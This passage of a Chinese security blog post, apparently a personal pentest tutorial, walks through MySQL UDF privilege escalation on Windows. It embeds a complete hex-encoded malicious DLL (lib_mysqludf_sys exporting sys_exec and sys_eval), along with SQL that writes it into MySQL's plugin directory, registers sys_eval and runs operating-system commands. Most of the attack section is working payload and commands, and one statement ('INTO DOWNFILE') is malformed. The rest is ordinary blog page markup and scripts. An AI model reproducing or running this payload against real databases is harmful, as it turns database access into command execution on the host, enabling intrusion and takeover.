100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">'B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140316.png" style="zoom:67%;">
+
+<p>方法三：创建临时表进行16进制数据写入</p>
+<p>创建一张临时表用于存放dll/so文件的十六进制内容</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> temp_udf(udf <span class="type">BLOB</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<ol>
+<li><strong><code>CREATE TABLE temp_udf</code></strong><ul>
+<li>创建一个名为 <code>temp_udf</code> 的表（临时存储用户定义函数或其他二进制数据）。</li>
+</ul>
+</li>
+<li><strong><code>udf BLOB</code></strong><ul>
+<li>定义了一个列 <code>udf</code>，数据类型为 <strong>BLOB</strong>（Binary Large Object，二进制大对象），用于存储二进制数据（如图片、文件、序列化对象等）。</li>
+<li>常见 BLOB 用途：<ul>
+<li>存储文件内容（如 PDF、图片）。</li>
+<li>保存序列化的程序数据（如 Python pickle 对象）。</li>
+<li>记录加密后的数据</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<p>通过16进制进行写入udf.dll文件</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> temp_udf <span class="keyword">values</span>( <span class="keyword">CONVERT</span>(<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b4dd452bb84d5a346627040b85bf2b5e6e413c03c1813850e45fefa5ecfffb33d2b90b011c48180f94c28bc25dc33fb702bf35e34831c80fb74114ae057106c1a55b6c33578c081817761bffff2ff1d7487bf972098b580803d93bfb720a4283c0283bd67270ca36b5e86ae55dc38f6afef0cd71f7a970040b056418005083ec080db7c670082f316c33c576f0852f06df64a31a89b90968555db7f081f0b2091c6b04f555972dd12c937d1350195c083b04e1c26f2724c1e81ff715e0018fefb6532b034f230059948be55dc3621ddb49a301ca3dafc0fae99525242631ccff29343232b61058054c50ac2cb41e97af12b60d56096b27d7616b20cfb0fbef2ae4e03160031f73d9665b9a6c038d2be0fafc046ba039f13cb4fc8a0d6c120c7d0dc395c3c1619c965154147fe41f3e783124f020140bdac40e5643b25d53ec1068f885626df4f888c9bf4ee640bb25eea0398466820d85c33149db9f0a359a04eb605675f869639fc1f6448b7598751f1033f0071476e6ca20189d271cb4f6ee6fedf4330c113bf77507be4f59eb0b85f30a7b047ea10ac1e0100bf0ce00f7d6076c840d1e045e5f01c33f5c05646464646064686c1405766474b000003ff4c20e034b0f20185f4e6f20ffffb7ff617267756d656e7473096c6c6f77656420287564663a206c69625f6dccfd6df77973716c0d5f73085f696e666f293918dfb6ff8f2076657273696f6e20302e01341f45787065f6dbdbdd637447657861076c79201a65207374723f5bdb5afb672074791b75726171217258c00e602b7477911fd86f030b3f8672206e616d48dbb1b71f436f756c246e6f74c4636113203058b76d186d2779af72f1483fda4d943f2003121071051bf29d5860214707d0604d0d0b0f81cb074ed961dd9703ab17cc2708a77527ecc00fd81f0a3b034fc0a07b851f03240328c1556583a200c5889251ca22d877bdb119bf44ff000f5565a3aa00a8aa9251645455c95532aaaafff61d455c0410020157616974466f00fc06c07253886c654f626a07c07f6b99145669727475616c417603e0f6370d536574456e76126f6ec000bc6dbf5661726961622b4118437265f76deb6e94546806640d47264375727222cd12f65b502a636573734914266e03e083135469636bde6e6bb1f6b6fd5175657279500366846d616e371667ef1b00fd0144697367374cfdb7eded6962727879436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span>,<span class="type">CHAR</span>));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>导出dll文件到指定目录</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> udf <span class="keyword">from</span> temp_udf <span class="keyword">INTO</span> DOWNFILE "B:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin";</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="3">
+<li>创建自定义函数sys_eval</li>
+</ol>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">'udf.dll'</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140537.png" style="zoom:67%;">
+
+<p>然后使用命令查看是否新增了sys_eval函数</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.func;</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20140854.png" style="zoom:67%;">
+
+<p>此处显示即为创建成功</p>
+<ol start="4">
+<li>执行系统命令</li>
+</ol>
+<p>创建成功那么就可以使用自定义函数执行系统命令</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'ipconfig'</span>);</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-01%20141055.png" style="zoom:67%;">
+
+<p>至此，提权成功</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">XMH</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2025/07/31/udf-ti-quan/">http://example.com/2025/07/31/udf-ti-quan/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">XMH</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            <span class="chip bg-color">No tag</span>
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="qq,qzone,wechat,weibo,douban" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">感谢你的赞！</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/zhifubao.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/weixin.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
+            <div class="card">
+                <a href="/2025/07/31/udf-ti-quan/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="UDF提权">
+                        
+                        <span class="card-title">UDF提权</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-31
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2025/07/26/solar-ying-ji-xiang-ying-yue-sai-7-yue-wp/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="Solar应急响应月赛-7月wp">
+                        
+                        <span class="card-title">Solar应急响应月赛-7月wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-26
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            XMH
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: xmhhmx的blog<br />'
+            + 'Author: HMX<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
